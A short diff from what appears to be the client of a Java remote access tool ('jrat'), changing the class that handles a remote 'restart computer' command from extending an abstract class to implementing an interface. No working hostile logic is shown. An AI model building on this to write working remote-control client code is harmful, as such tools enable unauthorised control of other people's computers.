@@ -4,7 +4,7 @@ import jrat.client.Connection;
 import jrat.common.Constants;
 import oslib.OperatingSystem;
 
-public class Packet29RestartComputer extends AbstractIncomingPacket {
+public class Packet29RestartComputer implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
